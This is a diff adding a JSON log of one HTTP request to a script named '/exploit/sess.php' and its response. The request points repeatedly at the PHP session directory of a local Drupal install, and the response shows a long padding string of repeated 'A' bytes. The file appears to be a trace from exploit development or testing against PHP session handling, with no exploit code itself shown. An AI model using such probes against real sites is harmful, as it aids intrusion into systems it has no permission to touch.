@@ -1,0 +1,8 @@
+{
+ "target": "/exploit/sess.php?q0=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q1=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q2=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q3=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q4=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q5=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q6=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q7=/tmp/opencode/drupaldx/sites/default/files/php/sessions",
+ "status": 200,
+ "sent": 80,
+ "ms": 5,
+ "err": null,
+ "body_head": "sid=tb1\nsl=/tmp/opencode/drupaldx/sites/default/files/php/sessions\nmem=2M\nfiles=0\nS=absent\nJ=absent\nK=absent\nx.type=string len=64987 hex=41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141\nok\n"
+}
